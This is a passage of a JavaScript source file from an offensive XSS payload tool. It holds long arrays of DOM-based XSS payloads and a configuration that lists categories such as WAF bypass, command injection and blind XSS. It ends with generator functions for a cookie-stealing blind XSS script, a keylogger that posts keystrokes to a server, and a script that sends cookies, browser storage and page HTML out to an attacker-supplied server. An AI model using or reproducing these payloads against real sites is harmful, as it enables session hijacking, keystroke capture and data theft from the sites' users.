            '<script>window.open("about:blank").document.write("<script>alert(\'XSS\')<\/script>")</script>',
            '<script>var w=window.open("about:blank");w.document.write("<script>alert(\'XSS\')<\/script>")</script>',
            '<script>var w=window.open("about:blank");w.eval("alert(\'XSS\')")</script>',
            '<script>var w=window.open("about:blank");w.Function("alert(\'XSS\')")()</script>',
            '<script>window.open("","_blank","width=100,height=100").document.write("<script>alert(\'XSS\')<\/script>")</script>'
        ],
        
        eval_location: [
            '<script>eval(location.hash.slice(1))</script>',
            '<script>eval(location.search.slice(1))</script>',
            '<script>eval(location.href.slice(location.href.indexOf("#")+1))</script>',
            '<script>eval(location.href.slice(location.href.indexOf("?")+1))</script>',
            '<script>eval(name)</script>',
            '<script>eval(document.cookie)</script>',
            '<script>eval(document.referrer)</script>',
            '<script>eval(window.name)</script>',
            '<script>eval(frames[0].name)</script>',
            '<script>eval(parent.name)</script>',
            '<script>eval(top.name)</script>',
            '<script>eval(localStorage.getItem("xss"))</script>',
            '<script>eval(sessionStorage.getItem("xss"))</script>',
            '<script>eval(document.getElementById("xss").innerHTML)</script>',
            '<script>eval(document.querySelector("#xss").innerHTML)</script>'
        ],
        
        dom_manipulation: [
            '<div id="xss"><img src=x onerror=alert("XSS")></div><script>document.getElementById("xss").innerHTML = "<img src=x onerror=alert(\'XSS\')>"</script>',
            '<div id="xss"></div><script>document.getElementById("xss").outerHTML = "<img src=x onerror=alert(\'XSS\')>"</script>',
            '<div id="xss"></div><script>document.getElementById("xss").insertAdjacentHTML("beforebegin", "<img src=x onerror=alert(\'XSS\')>")</script>',
            '<div id="xss"></div><script>setTimeout(function(){document.getElementById("xss").innerHTML = "<img src=x onerror=alert(\'XSS\')>"}, 1000)</script>',
            '<div id="xss"></div><script>setInterval(function(){document.getElementById("xss").innerHTML = "<img src=x onerror=alert(\'XSS\')>"}, 1000)</script>',
            '<div id="xss"></div><script>document.write("<img src=x onerror=alert(\'XSS\')>")</script>',
            '<div id="xss"></div><script>document.writeln("<img src=x onerror=alert(\'XSS\')>")</script>',
            '<div id="xss"></div><script>document.open(); document.write("<img src=x onerror=alert(\'XSS\')>"); document.close();</script>',
            '<div id="xss"></div><script>document.body.appendChild(document.createElement("img")).src = "x"; document.body.lastChild.onerror = alert;</script>',
            '<div id="xss"></div><script>document.body.innerHTML += "<img src=x onerror=alert(\'XSS\')>";</script>',
            '<div id="xss"></div><script>document.body.outerHTML = "<img src=x onerror=alert(\'XSS\')>";</script>',
            '<div id="xss"></div><script>document.documentElement.innerHTML = "<img src=x onerror=alert(\'XSS\')>";</script>',
            '<div id="xss"></div><script>document.documentElement.outerHTML = "<img src=x onerror=alert(\'XSS\')>";</script>'
        ],
        
        mutation_observer: [
            '<script>new MutationObserver(()=>alert("XSS")).observe(document.body,{childList:true})</script>',
            '<script>new MutationObserver(()=>alert("XSS")).observe(document.body,{attributes:true})</script>',
            '<script>new MutationObserver(()=>alert("XSS")).observe(document.body,{subtree:true})</script>',
            '<script>new MutationObserver((mutations)=>mutations.forEach(()=>alert("XSS"))).observe(document.body,{childList:true})</script>',
            '<script>new MutationObserver(()=>{},{}).observe(document.body,{childList:true});alert("XSS")</script>',
            '<script>var observer=new MutationObserver(()=>alert("XSS"));observer.observe(document.querySelector("#xss"),{childList:true})</script>',
            '<script>var observer=new MutationObserver(()=>alert("XSS"));observer.observe(document.querySelector("#xss"),{attributes:true})</script>',
            '<script>var observer=new MutationObserver(()=>alert("XSS"));observer.observe(document.querySelector("#xss"),{subtree:true})</script>',
            '<script>new MutationObserver(()=>alert("XSS")).observe(document.body,{childList:true,attributes:true,subtree:true})</script>',
            '<script>new MutationObserver(()=>alert("XSS")).observe(document.documentElement,{childList:true,attributes:true,subtree:true})</script>'
        ],
        
        intersection_observer: [
            '<script>new IntersectionObserver(()=>alert("XSS")).observe(document.body)</script>',
            '<script>new IntersectionObserver((entries)=>entries.forEach(()=>alert("XSS"))).observe(document.body)</script>',
            '<script>new IntersectionObserver(()=>{},{}).observe(document.body);alert("XSS")</script>',
            '<script>var observer=new IntersectionObserver(()=>alert("XSS"));observer.observe(document.querySelector("#xss"))</script>',
            '<script>var observer=new IntersectionObserver(()=>alert("XSS"));observer.observe(document.querySelector("div"))</script>',
            '<script>new IntersectionObserver(()=>alert("XSS")).observe(document.querySelector("#xss"))</script>',
            '<script>new IntersectionObserver(()=>alert("XSS")).observe(document.querySelector("img"))</script>',
            '<script>new IntersectionObserver(()=>alert("XSS")).observe(document.querySelector("iframe"))</script>',
            '<script>new IntersectionObserver(()=>alert("XSS")).observe(document.querySelector("object"))</script>',
            '<script>new IntersectionObserver(()=>alert("XSS")).observe(document.querySelector("embed"))</script>'
        ],
        
        resize_observer: [
            '<script>new ResizeObserver(()=>alert("XSS")).observe(document.body)</script>',
            '<script>new ResizeObserver((entries)=>entries.forEach(()=>alert("XSS"))).observe(document.body)</script>',
            '<script>new ResizeObserver(()=>{},{}).observe(document.body);alert("XSS")</script>',
            '<script>var observer=new ResizeObserver(()=>alert("XSS"));observer.observe(document.querySelector("#xss"))</script>',
            '<script>var observer=new ResizeObserver(()=>alert("XSS"));observer.observe(document.querySelector("div"))</script>',
            '<script>new ResizeObserver(()=>alert("XSS")).observe(document.querySelector("#xss"))</script>',
            '<script>new ResizeObserver(()=>alert("XSS")).observe(document.querySelector("img"))</script>',
            '<script>new ResizeObserver(()=>alert("XSS")).observe(document.querySelector("iframe"))</script>',
            '<script>new ResizeObserver(()=>alert("XSS")).observe(document.querySelector("object"))</script>',
            '<script>new ResizeObserver(()=>alert("XSS")).observe(document.querySelector("embed"))</script>'
        ],
        
        performance_observer: [
            '<script>new PerformanceObserver(()=>alert("XSS")).observe({entryTypes:["mark"]})</script>',
            '<script>new PerformanceObserver((list)=>list.getEntries().forEach(()=>alert("XSS"))).observe({entryTypes:["mark"]})</script>',
            '<script>new PerformanceObserver(()=>{},{}).observe({entryTypes:["mark"]});alert("XSS")</script>',
            '<script>var observer=new PerformanceObserver(()=>alert("XSS"));observer.observe({entryTypes:["mark"]})</script>',
            '<script>var observer=new PerformanceObserver(()=>alert("XSS"));observer.observe({entryTypes:["measure"]})</script>',
            '<script>new PerformanceObserver(()=>alert("XSS")).observe({entryTypes:["navigation"]})</script>',
            '<script>new PerformanceObserver(()=>alert("XSS")).observe({entryTypes:["resource"]})</script>',
            '<script>new PerformanceObserver(()=>alert("XSS")).observe({entryTypes:["paint"]})</script>',
            '<script>new PerformanceObserver(()=>alert("XSS")).observe({entryTypes:["largest-contentful-paint"]})</script>',
            '<script>new PerformanceObserver(()=>alert("XSS")).observe({entryTypes:["first-input"]})</script>'
        ]
    },
    
    custom: {
        user_defined: []
    }
};

// XSS Methods Configuration
const XSS_METHODS = {
    basic: {
        name: "Basic XSS",
        description: "Simple XSS payloads for beginners - Script tags, image onerror, basic event handlers",
        totalPayloads: 200,
        categories: [
            {id: 'script', name: 'Script Tags', count: 16, icon: 'code', color: '#00ff00'},
            {id: 'img', name: 'Image OnError', count: 14, icon: 'image', color: '#ff6600'},
            {id: 'svg', name: 'SVG OnLoad', count: 13, icon: 'vector-square', color: '#0080ff'},
            {id: 'iframe', name: 'Iframe Src', count: 12, icon: 'window-maximize', color: '#ff0080'},
            {id: 'input', name: 'Input Events', count: 14, icon: 'keyboard', color: '#ffff00'},
            {id: 'body', name: 'Body Events', count: 14, icon: 'square', color: '#00ffff'},
            {id: 'div', name: 'Div Events', count: 14, icon: 'th', color: '#ff0000'},
            {id: 'link', name: 'Link Href', count: 8, icon: 'link', color: '#800080'},
            {id: 'meta', name: 'Meta Refresh', count: 6, icon: 'sync', color: '#808080'},
            {id: 'object', name: 'Object Data', count: 8, icon: 'cube', color: '#008000'},
            {id: 'embed', name: 'Embed Src', count: 8, icon: 'play', color: '#ffa500'},
            {id: 'form', name: 'Form Action', count: 6, icon: 'wpforms', color: '#000080'},
            {id: 'button', name: 'Button Events', count: 8, icon: 'mouse-pointer', color: '#ff6347'},
            {id: 'a', name: 'Anchor Href', count: 7, icon: 'external-link-alt', color: '#32cd32'},
            {id: 'img_event', name: 'Image Events', count: 14, icon: 'image', color: '#ff1493'},
            {id: 'marquee', name: 'Marquee Events', count: 7, icon: 'arrows-alt-h', color: '#8b4513'},
            {id: 'details', name: 'Details Toggle', count: 6, icon: 'info-circle', color: '#4682b4'},
            {id: 'meter', name: 'Meter Events', count: 8, icon: 'tachometer-alt', color: '#2f4f4f'},
            {id: 'progress', name: 'Progress Events', count: 8, icon: 'tasks', color: '#708090'},
            {id: 'audio_video', name: 'Audio/Video', count: 11, icon: 'video', color: '#dc143c'},
            {id: 'mathml', name: 'MathML', count: 6, icon: 'calculator', color: '#8b008b'},
            {id: 'css', name: 'CSS Injection', count: 10, icon: 'css3', color: '#264de4'},
            {id: 'data_uri', name: 'Data URI', count: 8, icon: 'database', color: '#f16529'},
            {id: 'javascript_uri', name: 'JavaScript URI', count: 10, icon: 'js', color: '#f7df1e'},
            {id: 'vbscript', name: 'VBScript', count: 5, icon: 'windows', color: '#00bcf2'},
            {id: 'expression', name: 'CSS Expression', count: 10, icon: 'code', color: '#800000'},
            {id: 'meta_refresh', name: 'Meta Refresh', count: 5, icon: 'refresh', color: '#696969'},
            {id: 'polyglot', name: 'Polyglot', count: 10, icon: 'language', color: '#ff4500'}
        ],
        
        payloads: {
            script: XSS_PAYLOADS.basic.script,
            img: XSS_PAYLOADS.basic.img,
            svg: XSS_PAYLOADS.basic.svg,
            iframe: XSS_PAYLOADS.basic.iframe,
            input: XSS_PAYLOADS.basic.input,
            body: XSS_PAYLOADS.basic.body,
            div: XSS_PAYLOADS.basic.div,
            link: XSS_PAYLOADS.basic.link,
            meta: XSS_PAYLOADS.basic.meta,
            object: XSS_PAYLOADS.basic.object,
            embed: XSS_PAYLOADS.basic.embed,
            form: XSS_PAYLOADS.basic.form,
            button: XSS_PAYLOADS.basic.button,
            a: XSS_PAYLOADS.basic.a,
            img_event: XSS_PAYLOADS.basic.img_event,
            marquee: XSS_PAYLOADS.basic.marquee,
            details: XSS_PAYLOADS.basic.details,
            meter: XSS_PAYLOADS.basic.meter,
            progress: XSS_PAYLOADS.basic.progress,
            audio_video: XSS_PAYLOADS.basic.audio_video,
            mathml: XSS_PAYLOADS.basic.mathml,
            css: XSS_PAYLOADS.basic.css,
            data_uri: XSS_PAYLOADS.basic.data_uri,
            javascript_uri: XSS_PAYLOADS.basic.javascript_uri,
            vbscript: XSS_PAYLOADS.basic.vbscript,
            expression: XSS_PAYLOADS.basic.expression,
            meta_refresh: XSS_PAYLOADS.basic.meta_refresh,
            polyglot: XSS_PAYLOADS.basic.polyglot
        }
    },
    
    advanced: {
        name: "Advanced XSS",
        description: "Advanced techniques with encoding bypass, WAF bypass, HTML5 specific, mutation observers, and obfuscation",
        totalPayloads: 300,
        categories: [
            {id: 'event_handlers', name: 'Event Handlers', count: 40, icon: 'mouse-pointer', color: '#ff0000'},
            {id: 'encoding_bypass', name: 'Encoding Bypass', count: 16, icon: 'shield-alt', color: '#ff6600'},
            {id: 'waf_bypass', name: 'WAF Bypass', count: 17, icon: 'ban', color: '#ffff00'},
            {id: 'html5_new', name: 'HTML5 New', count: 23, icon: 'html5', color: '#00ff00'},
            {id: 'mutation', name: 'Mutation Based', count: 10, icon: 'dna', color: '#0080ff'},
            {id: 'javascript_mixed', name: 'JavaScript Mixed', count: 20, icon: 'js', color: '#ff0080'},
            {id: 'protocol_handler', name: 'Protocol Handler', count: 15, icon: 'link', color: '#800080'},
            {id: 'svg_advanced', name: 'SVG Advanced', count: 16, icon: 'vector-square', color: '#808080'},
            {id: 'mathml_advanced', name: 'MathML Advanced', count: 10, icon: 'calculator', color: '#008000'},
            {id: 'xml_advanced', name: 'XML Advanced', count: 5, icon: 'code', color: '#ffa500'},
            {id: 'flash', name: 'Flash', count: 11, icon: 'play', color: '#ff1493'},
            {id: 'xslt', name: 'XSLT', count: 3, icon: 'code', color: '#4682b4'},
            {id: 'xxe', name: 'XXE Injection', count: 5, icon: 'bug', color: '#dc143c'},
            {id: 'ldap_injection', name: 'LDAP Injection', count: 10, icon: 'folder', color: '#2f4f4f'},
            {id: 'xpath_injection', name: 'XPath Injection', count: 10, icon: 'search', color: '#708090'},
            {id: 'command_injection', name: 'Command Injection', count: 20, icon: 'terminal', color: '#000000'},
            {id: 'nosql_injection', name: 'NoSQL Injection', count: 10, icon: 'database', color: '#32cd32'},
            {id: 'ssti', name: 'SSTI Injection', count: 15, icon: 'code', color: '#8b008b'},
            {id: 'polyglot_advanced', name: 'Advanced Polyglot', count: 21, icon: 'language', color: '#ff4500'},
            {id: 'javascript_obfuscation', name: 'JS Obfuscation', count: 15, icon: 'lock', color: '#800000'},
            {id: 'css_expression', name: 'CSS Expression', count: 15, icon: 'css3', color: '#264de4'}
        ],
        
        payloads: {
            event_handlers: XSS_PAYLOADS.advanced.event_handlers,
            encoding_bypass: XSS_PAYLOADS.advanced.encoding_bypass,
            waf_bypass: XSS_PAYLOADS.advanced.waf_bypass,
            html5_new: XSS_PAYLOADS.advanced.html5_new,
            mutation: XSS_PAYLOADS.advanced.mutation,
            javascript_mixed: XSS_PAYLOADS.advanced.javascript_mixed,
            protocol_handler: XSS_PAYLOADS.advanced.protocol_handler,
            svg_advanced: XSS_PAYLOADS.advanced.svg_advanced,
            mathml_advanced: XSS_PAYLOADS.advanced.mathml_advanced,
            xml_advanced: XSS_PAYLOADS.advanced.xml_advanced,
            flash: XSS_PAYLOADS.advanced.flash,
            xslt: XSS_PAYLOADS.advanced.xslt,
            xxe: XSS_PAYLOADS.advanced.xxe,
            ldap_injection: XSS_PAYLOADS.advanced.ldap_injection,
            xpath_injection: XSS_PAYLOADS.advanced.xpath_injection,
            command_injection: XSS_PAYLOADS.advanced.command_injection,
            nosql_injection: XSS_PAYLOADS.advanced.nosql_injection,
            ssti: XSS_PAYLOADS.advanced.ssti,
            polyglot_advanced: XSS_PAYLOADS.advanced.polyglot_advanced,
            javascript_obfuscation: XSS_PAYLOADS.advanced.javascript_obfuscation,
            css_expression: XSS_PAYLOADS.advanced.css_expression
        }
    },
    
    blind: {
        name: "Blind XSS",
        description: "Blind XSS payloads with callbacks, delayed execution, persistent methods, and service workers",
        totalPayloads: 150,
        categories: [
            {id: 'callback', name: 'Callback URLs', count: 10, icon: 'phone', color: '#00ff00'},
            {id: 'delayed', name: 'Delayed Execution', count: 10, icon: 'clock', color: '#ff6600'},
            {id: 'persistent', name: 'Persistent Methods', count: 10, icon: 'sync', color: '#ffff00'},
            {id: 'service_worker', name: 'Service Workers', count: 10, icon: 'cog', color: '#0080ff'},
            {id: 'web_worker', name: 'Web Workers', count: 10, icon: 'cogs', color: '#ff0080'},
            {id: 'shared_worker', name: 'Shared Workers', count: 10, icon: 'share-alt', color: '#800080'},
            {id: 'message_channel', name: 'Message Channels', count: 10, icon: 'comment', color: '#808080'},
            {id: 'fetch_api', name: 'Fetch API', count: 10, icon: 'download', color: '#008000'},
            {id: 'beacon_api', name: 'Beacon API', count: 10, icon: 'broadcast-tower', color: '#ffa500'},
            {id: 'image_capture', name: 'Image Capture', count: 5, icon: 'camera', color: '#ff1493'},
            {id: 'presentation_api', name: 'Presentation API', count: 5, icon: 'tv', color: '#4682b4'},
            {id: 'web_share_api', name: 'Web Share API', count: 5, icon: 'share-alt', color: '#dc143c'},
            {id: 'web_bluetooth', name: 'Web Bluetooth', count: 5, icon: 'bluetooth', color: '#2f4f4f'},
            {id: 'web_usb', name: 'Web USB', count: 5, icon: 'usb', color: '#708090'},
            {id: 'web_serial', name: 'Web Serial', count: 5, icon: 'serial-port', color: '#000000'},
            {id: 'web_nfc', name: 'Web NFC', count: 5, icon: 'wifi', color: '#32cd32'},
            {id: 'webxr', name: 'WebXR', count: 5, icon: 'vr-cardboard', color: '#8b008b'},
            {id: 'file_api', name: 'File API', count: 10, icon: 'file', color: '#ff4500'},
            {id: 'drag_drop_advanced', name: 'Drag & Drop Advanced', count: 11, icon: 'arrows-alt', color: '#800000'},
            {id: 'clipboard_advanced', name: 'Clipboard Advanced', count: 15, icon: 'clipboard', color: '#264de4'},
            {id: 'web_share_advanced', name: 'Web Share Advanced', count: 5, icon: 'share-alt', color: '#f16529'}
        ],
        
        payloads: {
            callback: XSS_PAYLOADS.blind.callback,
            delayed: XSS_PAYLOADS.blind.delayed,
            persistent: XSS_PAYLOADS.blind.persistent,
            service_worker: XSS_PAYLOADS.blind.service_worker,
            web_worker: XSS_PAYLOADS.blind.web_worker,
            shared_worker: XSS_PAYLOADS.blind.shared_worker,
            message_channel: XSS_PAYLOADS.blind.message_channel,
            fetch_api: XSS_PAYLOADS.blind.fetch_api,
            beacon_api: XSS_PAYLOADS.blind.beacon_api,
            image_capture: XSS_PAYLOADS.blind.image_capture,
            presentation_api: XSS_PAYLOADS.blind.presentation_api,
            web_share_api: XSS_PAYLOADS.blind.web_share_api,
            web_bluetooth: XSS_PAYLOADS.blind.web_bluetooth,
            web_usb: XSS_PAYLOADS.blind.web_usb,
            web_serial: XSS_PAYLOADS.blind.web_serial,
            web_nfc: XSS_PAYLOADS.blind.web_nfc,
            webxr: XSS_PAYLOADS.blind.webxr,
            file_api: XSS_PAYLOADS.blind.file_api,
            drag_drop_advanced: XSS_PAYLOADS.blind.drag_drop_advanced,
            clipboard_advanced: XSS_PAYLOADS.blind.clipboard_advanced,
            web_share_advanced: XSS_PAYLOADS.blind.web_share_advanced
        }
    },
    
    dom: {
        name: "DOM XSS",
        description: "DOM-based XSS using location manipulation, hash changes, postMessage, storage, and DOM manipulation",
        totalPayloads: 200,
        categories: [
            {id: 'location', name: 'Location Manipulation', count: 20, icon: 'map-marker-alt', color: '#ff0000'},
            {id: 'hash', name: 'Hash Changes', count: 17, icon: 'hashtag', color: '#ff6600'},
            {id: 'name', name: 'Window Name', count: 10, icon: 'tag', color: '#ffff00'},
            {id: 'postMessage', name: 'PostMessage', count: 10, icon: 'comment', color: '#00ff00'},
            {id: 'localStorage', name: 'LocalStorage', count: 10, icon: 'save', color: '#0080ff'},
            {id: 'sessionStorage', name: 'SessionStorage', count: 10, icon: 'save', color: '#ff0080'},
            {id: 'cookies', name: 'Cookies', count: 10, icon: 'cookie', color: '#800080'},
            {id: 'document_write', name: 'Document Write', count: 15, icon: 'pen', color: '#808080'},
            {id: 'open_method', name: 'Window Open', count: 15, icon: 'window-maximize', color: '#008000'},
            {id: 'eval_location', name: 'Eval Location', count: 14, icon: 'crosshairs', color: '#ffa500'},
            {id: 'window_object', name: 'Window Object', count: 12, icon: 'window-restore', color: '#ff1493'},
            {id: 'document_object', name: 'Document Object', count: 15, icon: 'file', color: '#4682b4'},
            {id: 'location_object', name: 'Location Object', count: 12, icon: 'location-arrow', color: '#dc143c'},
            {id: 'history_object', name: 'History Object', count: 10, icon: 'history', color: '#2f4f4f'},
            {id: 'mutation_observer', name: 'Mutation Observer', count: 10, icon: 'dna', color: '#708090'},
            {id: 'intersection_observer', name: 'Intersection Observer', count: 10, icon: 'eye', color: '#000000'},
            {id: 'resize_observer', name: 'Resize Observer', count: 10, icon: 'arrows-alt', color: '#32cd32'},
            {id: 'performance_observer', name: 'Performance Observer', count: 10, icon: 'tachometer-alt', color: '#8b008b'},
            {id: 'setTimeout_interval', name: 'SetTimeout/Interval', count: 17, icon: 'clock', color: '#ff4500'},
            {id: 'function_constructor', name: 'Function Constructor', count: 12, icon: 'cog', color: '#800000'},
            {id: 'eval_based', name: 'Eval Based', count: 14, icon: 'code', color: '#264de4'},
            {id: 'dom_manipulation', name: 'DOM Manipulation', count: 15, icon: 'sitemap', color: '#f16529'}
        ],
        
        payloads: {
            location: XSS_PAYLOADS.dom.location,
            hash: XSS_PAYLOADS.dom.hash,
            name: XSS_PAYLOADS.dom.name,
            postMessage: XSS_PAYLOADS.dom.postMessage,
            localStorage: XSS_PAYLOADS.dom.localStorage,
            sessionStorage: XSS_PAYLOADS.dom.sessionStorage,
            cookies: XSS_PAYLOADS.dom.cookies,
            document_write: XSS_PAYLOADS.dom.document_write,
            open_method: XSS_PAYLOADS.dom.open_method,
            eval_location: XSS_PAYLOADS.dom.eval_location,
            window_object: XSS_PAYLOADS.dom.window_object,
            document_object: XSS_PAYLOADS.dom.document_object,
            location_object: XSS_PAYLOADS.dom.location_object,
            history_object: XSS_PAYLOADS.dom.history_object,
            mutation_observer: XSS_PAYLOADS.dom.mutation_observer,
            intersection_observer: XSS_PAYLOADS.dom.intersection_observer,
            resize_observer: XSS_PAYLOADS.dom.resize_observer,
            performance_observer: XSS_PAYLOADS.dom.performance_observer,
            setTimeout_interval: XSS_PAYLOADS.dom.setTimeout_interval,
            function_constructor: XSS_PAYLOADS.dom.function_constructor,
            eval_based: XSS_PAYLOADS.dom.eval_based,
            dom_manipulation: XSS_PAYLOADS.dom.dom_manipulation
        }
    },
    
    custom: {
        name: "Custom Payloads",
        description: "User-defined custom XSS payloads",
        totalPayloads: 0,
        categories: [
            {id: 'user_defined', name: 'User Defined', count: 0, icon: 'user', color: '#00ff00'}
        ],
        
        payloads: {
            user_defined: XSS_PAYLOADS.custom.user_defined
        }
    }
};

// Helper functions
function encodePayload(payload, encoding) {
    switch(encoding) {
        case 'url':
            return encodeURIComponent(payload);
        case 'html':
            return payload.split('').map(c => '&#' + c.charCodeAt(0) + ';').join('');
        case 'hex':
            return Array.from(new TextEncoder().encode(payload)).map(b => '%' + b.toString(16).padStart(2, '0')).join('');
        case 'unicode':
            return payload.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
        case 'base64':
            return btoa(payload);
        default:
            return payload;
    }
}

function generateBlindPayload(serverUrl, identifier) {
    return `<script src="${serverUrl}/xss.js?uid=${identifier}&cookies=${encodeURIComponent(document.cookie)}&url=${encodeURIComponent(window.location.href)}"></script>`;
}

function generateKeyloggerPayload(serverUrl) {
    return `<script>
document.addEventListener('keydown', function(e) {
    fetch('${serverUrl}/log.php', {
        method: 'POST',
        body: JSON.stringify({
            key: e.key,
            code: e.code,
            target: e.target.tagName,
            value: e.target.value || '',
            timestamp: Date.now(),
            url: window.location.href
        }),
        headers: {'Content-Type': 'application/json'}
    });
});
</script>`;
}

function generateDataExfilPayload(serverUrl) {
    return `<script>
var data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    href: window.location.href,
    domain: document.domain,
    title: document.title,
    referrer: document.referrer,
    lastModified: document.lastModified,
    html: document.body.innerHTML.substring(0, 10000)
};

fetch('${serverUrl}/exfil.php', {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {'Content-Type': 'application/json'}
});
</script>`;
}

// Export for use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { 
        XSS_PAYLOADS, 
        XSS_METHODS,
        encodePayload, 
        generateBlindPayload, 
        generateKeyloggerPayload, 
        generateDataExfilPayload 
    };
          }
